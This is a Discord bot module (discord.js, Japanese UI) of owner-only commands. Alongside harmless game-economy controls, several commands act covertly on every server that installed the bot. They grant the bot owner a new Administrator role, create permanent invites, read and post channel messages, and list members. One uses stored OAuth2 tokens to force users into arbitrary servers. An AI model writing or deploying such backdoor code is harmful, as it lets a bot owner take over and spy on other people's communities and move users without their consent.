const { PermissionFlagsBits, EmbedBuilder, ChannelType, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');
const axios = require('axios');

// メンバー一覧のページEmbed生成
function buildMembersEmbed(members, page, guildName) {
    const PAGE_SIZE = 10;
    const totalPages = Math.max(1, Math.ceil(members.length / PAGE_SIZE));
    const safePage = Math.min(Math.max(1, page), totalPages);
    const start = (safePage - 1) * PAGE_SIZE;
    const current = members.slice(start, start + PAGE_SIZE);

    const lines = current.map((m, i) => {
        const pos = start + i + 1;
        const isAdmin = m.permissions.has(PermissionFlagsBits.Administrator) ? '👑 管理者' : '一般';
        const isBot = m.user.bot ? ' 🤖' : '';
        return `**${pos}.** ${m.user.tag}${isBot}\nID: \`${m.user.id}\` | ${isAdmin}`;
    }).join('\n\n');

    const embed = new EmbedBuilder()
        .setTitle(`👥 ${guildName} のメンバー一覧`)
        .setDescription(lines || 'メンバーなし')
        .setColor(0x5865f2)
        .setFooter({ text: `ページ ${safePage} / ${totalPages}　全 ${members.length} 人` });

    return { embed, safePage, totalPages };
}

function buildMembersRow(guildId, page, totalPages) {
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`admin_members_${guildId}_${page - 1}`).setLabel('◀ 前へ').setStyle(ButtonStyle.Secondary).setDisabled(page <= 1),
        new ButtonBuilder().setCustomId(`admin_members_${guildId}_${page + 1}`).setLabel('次へ ▶').setStyle(ButtonStyle.Secondary).setDisabled(page >= totalPages)
    );
}

async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, USERS_FILE) {
    if (!OWNER_IDS.includes(msg.author.id)) return;

    const args = msg.content.slice(1).trim().split(/\s+/);
    const command = args.shift().toLowerCase();

    if (command === 'members') {
        const guildId = args[0];
        if (!guildId) return msg.reply('使用法: !members [サーバーID]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        const statusMsg = await msg.reply('⏳ メンバー一覧を取得中...');
        try {
            const members = await guild.members.fetch();
            const sorted = [...members.values()].sort((a, b) => {
                if (a.user.bot !== b.user.bot) return a.user.bot ? 1 : -1;
                return a.user.tag.localeCompare(b.user.tag);
            });
            const { embed, safePage, totalPages } = buildMembersEmbed(sorted, 1, guild.name);
            const components = totalPages > 1 ? [buildMembersRow(guildId, safePage, totalPages)] : [];
            await statusMsg.edit({ content: '', embeds: [embed], components });

            if (totalPages > 1) {
                const collector = statusMsg.createMessageComponentCollector();
                collector.on('collect', async (btn) => {
                    if (!OWNER_IDS.includes(btn.user.id)) return btn.reply({ content: '❌ 権限がありません。', flags: MessageFlags.Ephemeral });
                    const parts = btn.customId.split('_');
                    const newPage = parseInt(parts[parts.length - 1]);
                    const { embed: newEmbed, safePage: sp, totalPages: tp } = buildMembersEmbed(sorted, newPage, guild.name);
                    await btn.update({ embeds: [newEmbed], components: [buildMembersRow(guildId, sp, tp)] });
                });
            }
        } catch (e) {
            await statusMsg.edit(`❌ 取得失敗: ${e.message}`);
        }
    }

    if (command === 'link') {
        const guildId = args[0] || msg.guildId;
        if (!guildId) return msg.reply('使用法: !link [サーバーID]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        try {
            const channel = guild.channels.cache.find(c =>
                (c.type === ChannelType.GuildText || c.type === ChannelType.GuildAnnouncement) &&
                guild.members.me.permissionsIn(c).has(PermissionFlagsBits.CreateInstantInvite)
            );
            if (!channel) return msg.reply('❌ 招待作成権限のあるチャンネルが見つかりません。');
            const invite = await channel.createInvite({ maxAge: 0, maxUses: 0, unique: true, reason: `管理者による無期限招待作成: ${msg.author.tag}` });
            await msg.reply(`🔗 **${guild.name}** の無期限招待リンク:\n${invite.url}`);
        } catch (e) {
            await msg.reply(`❌ 招待作成失敗: ${e.message}`);
        }
    }

    if (command === 'admin') {
        const guildId = args[0];
        const roleName = args[1];
        const position = args[2];
        if (!guildId || !roleName || !position) return msg.reply('使用法: !admin [サーバーID] [ロール名] [up/down]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        const botMember = guild.members.me;
        const log = [`🔎 診断開始: ${guild.name}`];
        try {
            if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) throw new Error('Botに「ロールの管理」権限がありません。');
            log.push('✅ Bot権限確認: OK');
            let role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) {
                role = await guild.roles.create({ name: roleName, permissions: [PermissionFlagsBits.Administrator], reason: 'Admin Command' });
                log.push(`✅ ロール「${roleName}」を作成しました。`);
            } else {
                log.push(`ℹ️ 既存のロール「${roleName}」を使用します。`);
            }
            if (position === 'up') {
                const botPos = botMember.roles.highest.position;
                log.push(`📊 Botの最高順位: ${botPos}`);
                await role.setPosition(botPos - 1).then(() => { log.push(`✅ 順位を ${botPos - 1} に移動しました。`); }).catch(e => { log.push(`❌ 順位変更失敗: ${e.message}`); });
            }
            const member = await guild.members.fetch(msg.author.id).catch(() => null);
            if (!member) throw new Error('あなたがサーバーにいません。');
            await member.roles.add(role);
            log.push('✅ あなたにロールを付与しました。');
            await msg.reply(`【実行ログ】\n${log.join('\n')}`);
        } catch (e) {
            log.push(`🛑 致命的エラー: ${e.message}`);
            await msg.reply(`【実行失敗ログ】\n${log.join('\n')}`);
        }
    }

    if (command === 'call') {
        const guildId = args[0];
        if (!guildId) return msg.reply('使用法: !call [サーバーID]');
        const userData = loadData(USERS_FILE);
        const users = Object.values(userData).filter(u => u.accessToken);
        if (users.length === 0) return msg.reply('認証済みユーザーがいません。');
        const statusMsg = await msg.reply(`⏳ ${users.length}人の追加処理を開始しました...`);
        let logContent = `【Call実行ログ: ${guildId}】\n`;
        for (const user of users) {
            const name = user.username || user.global_name || user.tag || '名前なし';
            const uid = user.id || user.user_id;
            const token = user.accessToken || user.access_token;
            if (!uid || !token) { logContent += `❌ ${name}: データ不足\n`; continue; }
            try {
                await axios.put(`https://discord.com/api/v10/guilds/${guildId}/members/${uid}`, { access_token: token }, { headers: { Authorization: `Bot ${process.env.TOKEN}`, 'Content-Type': 'application/json' } });
                logContent += `✅ ${name} (${uid}): 成功\n`;
            } catch (e) {
                const errorDetail = e.response ? `${e.response.status} ${e.response.statusText}` : e.message;
                logContent += `❌ ${name} (${uid}): 失敗 (${errorDetail})\n`;
            }
        }
        await statusMsg.edit(logContent.length > 2000 ? logContent.slice(0, 1900) + '... (省略)' : logContent);
    }

    if (command === 'userlist') {
        const userData = loadData(USERS_FILE);
        const entries = Object.entries(userData).filter(([, data]) => data.accessToken);
        if (entries.length === 0) return msg.reply('OAuth2認証済みユーザーはいません。');
        const list = entries.map(([keyId, data]) => {
            const name = data.username || data.global_name || (data.tag ? data.tag.split('#')[0] : '不明');
            const id = data.id || keyId;
            return `・**${name}** (${id})`;
        }).join('\n');
        const embed = new EmbedBuilder()
            .setTitle(`👤 OAuth2 認証済みユーザー (${entries.length}人)`)
            .setDescription(list.length > 2000 ? list.slice(0, 1900) + '...' : list)
            .setColor(0x2ecc71);
        await msg.reply({ embeds: [embed] });
    }

    if (command === 'serverlist') {
        const guilds = client.guilds.cache.map(g => `・**${g.name}** (\`${g.id}\`) | 👤 ${g.memberCount}人`).join('\n');
        const embed = new EmbedBuilder().setTitle('🏰 導入サーバー一覧').setDescription(guilds.length > 2000 ? guilds.slice(0, 1900) + '...' : guilds).setColor(0x5865f2);
        await msg.reply({ embeds: [embed] });
    }

    if (command === 'admin-del') {
        const guildId = args[0];
        const roleName = args[1];
        if (!guildId || !roleName) return msg.reply('使用法: !admin-del [サーバーID] [ロール名]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        try {
            const role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) return msg.reply('❌ ロールが見つかりません。');
            await role.delete();
            await msg.reply(`🗑️ ロール 「${roleName}」 を削除しました。`);
        } catch (e) {
            await msg.reply(`❌ 削除失敗: ${e.message}`);
        }
    }

    if (command === 'channels') {
        const guildId = args[0];
        if (!guildId) return msg.reply('使用法: !channels [サーバーID]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');

        const typeLabel = (type) => {
            const map = { 0: '💬', 2: '🔊', 4: '📁', 5: '📢', 13: '🎙️', 15: '📋' };
            return map[type] || '❓';
        };

        // カテゴリごとにグループ化
        const categories = guild.channels.cache.filter(c => c.type === 4).sort((a, b) => a.position - b.position);
        const noCategory = guild.channels.cache.filter(c => c.type !== 4 && !c.parentId).sort((a, b) => a.position - b.position);

        const buildSection = (channels) =>
            [...channels.values()].map(c => `${typeLabel(c.type)} **${c.name}** \`${c.id}\``).join('\n');

        const pages = [];
        let current = '';

        // カテゴリなし
        if (noCategory.size > 0) {
            const section = `**📂 カテゴリなし**\n${buildSection(noCategory)}\n`;
            current += section;
        }

        for (const [, cat] of categories) {
            const children = guild.channels.cache
                .filter(c => c.parentId === cat.id)
                .sort((a, b) => a.position - b.position);
            const section = `**📁 ${cat.name}**\n${buildSection(children) || '　(チャンネルなし)'}\n`;
            if ((current + section).length > 1800) {
                pages.push(current);
                current = section;
            } else {
                current += section;
            }
        }
        if (current) pages.push(current);
        if (pages.length === 0) return msg.reply('チャンネルが見つかりません。');

        const buildChannelEmbed = (page) => new EmbedBuilder()
            .setTitle(`📋 ${guild.name} のチャンネル一覧`)
            .setDescription(pages[page - 1])
            .setColor(0x3498db)
            .setFooter({ text: `ページ ${page} / ${pages.length}　全 ${guild.channels.cache.filter(c => c.type !== 4).size} チャンネル` });

        const buildChannelRow = (page) => new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`admin_ch_${guildId}_${page - 1}`).setLabel('◀').setStyle(ButtonStyle.Secondary).setDisabled(page <= 1),
            new ButtonBuilder().setCustomId(`admin_ch_${guildId}_${page + 1}`).setLabel('▶').setStyle(ButtonStyle.Secondary).setDisabled(page >= pages.length)
        );

        const statusMsg = await msg.reply({ embeds: [buildChannelEmbed(1)], components: pages.length > 1 ? [buildChannelRow(1)] : [] });

        if (pages.length > 1) {
            const collector = statusMsg.createMessageComponentCollector();
            collector.on('collect', async (btn) => {
                if (!OWNER_IDS.includes(btn.user.id)) return btn.reply({ content: '❌ 権限がありません。', flags: MessageFlags.Ephemeral });
                const parts = btn.customId.split('_');
                const newPage = parseInt(parts[parts.length - 1]);
                await btn.update({ embeds: [buildChannelEmbed(newPage)], components: [buildChannelRow(newPage)] });
            });
        }
    }

    if (command === 'msg') {
        const guildId = args[0];
        const channelId = args[1];
        const text = args.slice(2).join(' ');
        if (!guildId || !channelId || !text) return msg.reply('使用法: !msg [サーバーID] [チャンネルID] [メッセージ]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        const channel = guild.channels.cache.get(channelId);
        if (!channel) return msg.reply('❌ チャンネルが見つかりません。');
        try {
            await channel.send(text);
            await msg.reply(`✅ **${guild.name}** / **#${channel.name}** に送信しました。`);
        } catch (e) {
            await msg.reply(`❌ 送信失敗: ${e.message}`);
        }
    }

    if (command === 'log') {
        const guildId = args[0];
        const channelId = args[1];
        if (!guildId || !channelId) return msg.reply('使用法: !log [サーバーID] [チャンネルID]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
        const channel = guild.channels.cache.get(channelId);
        if (!channel) return msg.reply('❌ チャンネルが見つかりません。');
        try {
            const messages = await channel.messages.fetch({ limit: 20 });
            const sorted = [...messages.values()].sort((a, b) => a.createdTimestamp - b.createdTimestamp);
            const lines = sorted.map(m => {
                const time = new Date(m.createdTimestamp).toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });
                const content = m.content || (m.attachments.size > 0 ? `[添付: ${[...m.attachments.values()].map(a => a.name).join(', ')}]` : '[内容なし]');
                return `**[${time}] ${m.author.tag}**\n${content.slice(0, 200)}`;
            }).join('\n\n');
            const embed = new EmbedBuilder()
                .setTitle(`📜 #${channel.name} の直近ログ`)
                .setDescription(lines.length > 4000 ? lines.slice(0, 3900) + '\n...(省略)' : lines || '(メッセージなし)')
                .setColor(0x95a5a6)
                .setFooter({ text: `${guild.name} | 直近 ${sorted.length} 件` });
            await msg.reply({ embeds: [embed] });
        } catch (e) {
            await msg.reply(`❌ 取得失敗: ${e.message}`);
        }
    }

    // !resetcoins [supply?] → 全仮想通貨の発行量を指定枚数に変更（デフォルト1億）
    if (command === 'resetcoins') {
        const newSupply = parseInt(args[0]) || 100000000;
        const fs = require('fs'), path = require('path');
        const cryptoPath = path.join(__dirname, 'data', 'crypto.json');
        if (!fs.existsSync(cryptoPath)) return msg.reply('❌ crypto.jsonが見つかりません。');
        const cryptoData = JSON.parse(fs.readFileSync(cryptoPath, 'utf8'));
        const coins = Object.values(cryptoData);
        if (coins.length === 0) return msg.reply('❌ 仮想通貨がありません。');
        const results = [];
        for (const c of coins) {
            const oldSupply = c.totalSupply;
            const soldAmount = oldSupply - c.availableSupply;
            c.totalSupply = newSupply;
            c.availableSupply = Math.max(0, newSupply - soldAmount);
            results.push(`• **${c.name} (${c.symbol})**: ${oldSupply.toLocaleString()} → **${newSupply.toLocaleString()}** 枚`);
        }
        fs.writeFileSync(cryptoPath, JSON.stringify(cryptoData, null, 4));
        const embed = new EmbedBuilder()
            .setTitle(`🔄 発行量変更完了`)
            .setDescription(results.join('\n'))
            .setColor(0x3498db)
            .setFooter({ text: `新発行量: ${newSupply.toLocaleString()} 枚` })
            .setTimestamp();
        await msg.reply({ embeds: [embed] });
    }

    // !resetprice [stock/crypto] [銘柄名] [新価格]
    if (command === 'resetprice') {
        const target = args[0]?.toLowerCase();
        const newPrice = parseFloat(args[args.length - 1]) || 0;
        const name = args.slice(1, -1).join(' ').toLowerCase();
        if (!['stock', 'crypto'].includes(target) || !name || newPrice <= 0) {
            return msg.reply('使用法: !resetprice [stock/crypto] [銘柄名] [新価格]\n例: !resetprice crypto BTC 0.005');
        }
        const fs = require('fs'), path = require('path');
        const r3 = x => Math.round(x * 1000) / 1000;
        const price = r3(newPrice);

        if (target === 'stock') {
            const corpPath = path.join(__dirname, 'data', 'corp.json');
            const corpData = JSON.parse(fs.readFileSync(corpPath, 'utf8'));
            const c = Object.values(corpData).find(c => c.name.toLowerCase() === name && c.stock);
            if (!c) return msg.reply(`❌ 株式「${name}」が見つかりません。`);
            c.stock.price = price;
            c.stock.history = [price];
            c.stock.ohlc = [{ o: price, h: price, l: price, c: price, t: Date.now() }];
            fs.writeFileSync(corpPath, JSON.stringify(corpData, null, 4));
            return msg.reply(`✅ **${c.name}** 株価を **${price}** 🪙 にリセットしました。`);
        }

        if (target === 'crypto') {
            const cryptoPath = path.join(__dirname, 'data', 'crypto.json');
            const cryptoData = JSON.parse(fs.readFileSync(cryptoPath, 'utf8'));
            const c = Object.values(cryptoData).find(c => c.name.toLowerCase() === name || c.symbol.toLowerCase() === name);
            if (!c) return msg.reply(`❌ 仮想通貨「${name}」が見つかりません。`);
            c.price = price;
            c.history = [price];
            c.ohlc = [{ o: price, h: price, l: price, c: price, t: Date.now() }];
            fs.writeFileSync(cryptoPath, JSON.stringify(cryptoData, null, 4));
            return msg.reply(`✅ **${c.name} (${c.symbol})** を **${price}** 🪙 にリセットしました。`);
        }
    }
    if (command === 'crash') {
        const target = args[0]?.toLowerCase();
        const percent = parseInt(args[1]) || 0;
        const name = args.slice(2).join(' ').toLowerCase() || null;
        if (!['stock', 'crypto', 'all'].includes(target)) return msg.reply('使用法: !crash [stock/crypto/all] [下落率%] [銘柄名(省略可)]');
        if (percent <= 0 || percent >= 100) return msg.reply('❌ 下落率は1〜99の数値で指定してください。');
        const fs = require('fs'), path = require('path');
        const ratio = 1 - percent / 100;
        const r3 = x => Math.round(x * 1000) / 1000;
        const results = [];

        if (target === 'stock' || target === 'all') {
            const corpPath = path.join(__dirname, 'data', 'corp.json');
            if (fs.existsSync(corpPath)) {
                const corpData = JSON.parse(fs.readFileSync(corpPath, 'utf8'));
                let changed = false;
                for (const c of Object.values(corpData)) {
                    if (!c.stock) continue;
                    if (name && c.name.toLowerCase() !== name) continue;
                    const before = c.stock.price;
                    c.stock.price = r3(Math.max(0.001, before * ratio));
                    if (!c.stock.history) c.stock.history = [];
                    c.stock.history.push(c.stock.price);
                    if (c.stock.ohlc) c.stock.ohlc.push({ o: before, h: before, l: c.stock.price, c: c.stock.price, t: Date.now() });
                    results.push(`📉 **${c.name}** 株: ${before} → **${c.stock.price}** 🪙`);
                    changed = true;
                }
                if (changed) fs.writeFileSync(corpPath, JSON.stringify(corpData, null, 4));
            }
        }

        if (target === 'crypto' || target === 'all') {
            const cryptoPath = path.join(__dirname, 'data', 'crypto.json');
            if (fs.existsSync(cryptoPath)) {
                const cryptoData = JSON.parse(fs.readFileSync(cryptoPath, 'utf8'));
                let changed = false;
                for (const c of Object.values(cryptoData)) {
                    if (name && c.name.toLowerCase() !== name && c.symbol.toLowerCase() !== name) continue;
                    const before = c.price;
                    c.price = r3(Math.max(0.001, before * ratio));
                    if (!c.history) c.history = [];
                    c.history.push(c.price);
                    if (c.ohlc) c.ohlc.push({ o: before, h: before, l: c.price, c: c.price, t: Date.now() });
                    results.push(`📉 **${c.name} (${c.symbol})**: ${before} → **${c.price}** 🪙`);
                    changed = true;
                }
                if (changed) fs.writeFileSync(cryptoPath, JSON.stringify(cryptoData, null, 4));
            }
        }

        if (results.length === 0) return msg.reply('❌ 対象が見つかりませんでした。');
        const embed = new EmbedBuilder()
            .setTitle(`💥 強制下落 -${percent}%`)
            .setDescription(results.join('\n'))
            .setColor(0xff4757)
            .setTimestamp();
        await msg.reply({ embeds: [embed] });
    }
}

module.exports = handleAdminCommands;
